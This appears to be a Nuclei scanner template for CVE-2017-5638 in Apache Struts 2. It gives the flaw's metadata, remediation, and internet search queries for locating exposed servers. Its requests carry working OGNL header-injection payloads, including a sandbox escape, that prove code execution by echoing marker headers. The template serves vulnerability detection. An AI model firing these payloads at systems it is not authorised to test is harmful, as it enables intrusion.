id: cve-2017-5638

info:
  name: Apache Struts 2 - Remote Code Execution
  author: Random_Robbie,yawningmoney
  severity: critical
  description: |
    The Jakarta Multipart parser in Apache Struts 2 2.3.5 through 2.3.31 and 2.5.x through 2.5.10 has incorrect exception handling and error-message generation during file-upload attempts, which allows remote attackers to execute arbitrary commands via a crafted Content-Type, Content-Disposition, or Content-Length HTTP header.
  impact: |
    Remote attackers can execute arbitrary commands on the target system.
  remediation: |
    Upgrade to Apache Struts 2.3.32 or 2.5.10.1 or apply the necessary patches.
  reference:
    - https://cwiki.apache.org/confluence/display/WW/S2-045
    - https://nvd.nist.gov/vuln/detail/CVE-2017-5638
    - https://blog.qualys.com/product-tech/2017/03/14/apache-struts-cve-2017-5638-vulnerability-and-the-qualys-solution
    - https://github.com/mazen160/struts-pwn
    - https://www.exploit-db.com/exploits/41570
    - https://www.f5.com/company/blog/nginx/modsecurity-apache-struts-cve-2017-5638
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2017-5638
    cwe-id: CWE-20
  cpe: cpe:2.3:a:apache:struts:*
  metadata:
    verified: true
    max-request: 15
    vendor: apache
    product: struts
    shodan-query:
      - html:"Apache Struts"
      - http.title:"struts2 showcase"
      - http.html:"struts problem report"
      - http.html:"apache struts"
    fofa-query:
      - body="struts problem report"
      - title="struts2 showcase"
      - body="apache struts"
    google-query: intitle:"struts2 showcase"
  tags: cve2017,cve,apache,kev,msf,struts,rce

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
        Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Vulnerable-Struts','{{randstr}}')}.multipart/form-data
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Connection: close

      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
        Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Calc-Result',3195*5088)}.multipart/form-data
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Connection: close

      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
        Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.addHeader('X-Struts2','{{randstr}}')).(#res.getWriter().flush())}.multipart/form-data
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Connection: close

      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
        Content-Disposition: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Vulnerable-Struts','{{randstr}}')}.multipart/form-data
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Connection: close

      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
        Content-Length: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Vulnerable-Struts','{{randstr}}')}.multipart/form-data
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Connection: close

      - |
        POST /index.action HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
        Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Vulnerable-Struts','{{randstr}}')}.multipart/form-data
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Connection: close
        Content-Length: 0

      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
        Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo ilovemilfs').(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.addHeader('X-Echo-Result','ilovemilfs')).(#res.getWriter().flush())}.multipart/form-data
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Connection: close

    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/index.action"
      - "{{BaseURL}}/index.do"
      - "{{BaseURL}}/struts2-showcase/"
      - "{{BaseURL}}/struts2-showcase/index.action"
      - "{{BaseURL}}/struts2-rest-showcase/orders/3"
      - "{{BaseURL}}/struts2-rest-showcase/orders.xhtml"
      - "{{BaseURL}}/struts2-blank/example/HelloWorld.action"
      - "{{BaseURL}}/struts2-blank/example/Login.action"
      - "{{BaseURL}}/api/struts2-rest-showcase/orders/3"
      - "{{BaseURL}}/api/struts2-rest-showcase/orders.xhtml"
      - "{{BaseURL}}/api/index.action"
      - "{{BaseURL}}/api/index.do"
      - "{{BaseURL}}/json/index.action"
      - "{{BaseURL}}/rest/index.action"

    stop-at-first-match: true
    matchers:
      - type: regex
        part: header
        name: header_injection
        regex:
          - "(?i)X-Vulnerable-Struts: [a-zA-Z0-9]+"

      - type: regex
        part: header
        name: math_operation
        regex:
          - "X-Calc-Result: 16256160"

      - type: regex
        part: header
        name: alt_ognl_pattern
        regex:
          - "(?i)X-Struts2: [a-zA-Z0-9]+"

      - type: regex
        part: header
        name: echo_command
        regex:
          - "X-Echo-Result: ilovemilfs"

    extractors:
      - type: regex
        name: vulnerable_header
        part: header
        internal: true
        regex:
          - "(?i)X-Vulnerable-Struts: ([a-zA-Z0-9]+)"
          - "X-Calc-Result: ([0-9]+)"
          - "(?i)X-Struts2: ([a-zA-Z0-9]+)"
          - "X-Echo-Result: (ilovemilfs)"
    condition: or
